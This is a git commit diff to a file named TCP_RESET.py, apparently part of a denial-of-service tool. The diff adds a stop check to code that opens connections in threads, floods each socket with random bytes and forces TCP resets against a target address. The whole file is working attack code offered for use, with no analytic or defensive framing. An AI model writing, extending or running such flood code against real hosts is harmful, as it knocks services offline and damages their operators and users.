100e83b9addcf1bdf7ba359b68a740a5ad52b320
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2024-05-11 13:12:55 +0700

    Update TCP_RESET.py

--- methods/TCP_RESET.py
+++ methods/TCP_RESET.py
@@ -1,14 +1,18 @@
 import socket,struct,threading,sys,os
+from MODEL.data import read
 
 def TCP_RESET(s,size):
   try:
-   for _ in range(250):s.sendall(os.urandom(size)); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+   for _ in range(250):
+     if read() == True:break
+     s.sendall(os.urandom(size)); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
    s.shutdown(socket.SHUT_RDWR); s.close()
   except:pass
 
 def CNC(addr,size):
   try:
      for _ in range(250):
+      if read() == True:break
       s = socket.create_connection(addr)
       threading.Thread(target=TCP_RESET,args=(s,size)).start()
   except Exception as e:print(e)
